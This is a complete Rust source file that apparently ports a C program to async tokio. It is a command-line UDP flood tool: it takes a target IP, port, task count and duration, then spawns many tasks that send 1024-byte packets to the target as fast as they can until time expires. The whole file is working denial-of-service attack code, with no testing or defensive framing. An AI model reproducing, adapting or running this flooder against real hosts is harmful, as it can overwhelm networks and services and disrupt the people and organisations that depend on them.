use tokio::net::UdpSocket;
use tokio::task;
use std::sync::Arc;
use std::env;
use std::time::{Instant, Duration};

const PACKET_SIZE: usize = 1024;

struct ThreadArgs {
    server_addr: Arc<String>,
    end_time: Instant,
}

// Equivalent to `udp_flood()` in C but using async Rust
async fn udp_flood(args: Arc<ThreadArgs>) {
    let socket = UdpSocket::bind("0.0.0.0:0").await.expect("Socket creation failed");
    let packet = vec![b'A'; PACKET_SIZE];
    
    while Instant::now() < args.end_time {
        let _ = socket.send_to(&packet, &args.server_addr).await;
    }
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 5 {
        eprintln!("Usage: {} <IP> <Port> <Threads> <Time (seconds)>", args[0]);
        return;
    }

    let ip = args[1].clone();
    let port: u16 = args[2].parse().expect("Invalid port number");
    let threads: usize = args[3].parse().expect("Invalid thread count");
    let duration: u64 = args[4].parse().expect("Invalid duration");
    let end_time = Instant::now() + Duration::from_secs(duration);

    let server_addr = Arc::new(format!("{}:{}", ip, port));
    let thread_args = Arc::new(ThreadArgs { server_addr, end_time });

    println!("Starting UDP flood on {}:{} for {} seconds using {} threads.", ip, port, duration, threads);

    let mut tasks = Vec::new();

    // Spawn user-specified number of async tasks (equivalent to pthreads)
    for _ in 0..threads {
        let args_clone = Arc::clone(&thread_args);
        tasks.push(task::spawn(udp_flood(args_clone)));
    }

    // Wait for all tasks to complete
    for t in tasks {
        t.await.expect("Task failed");
    }

    println!("UDP flood completed.");
}
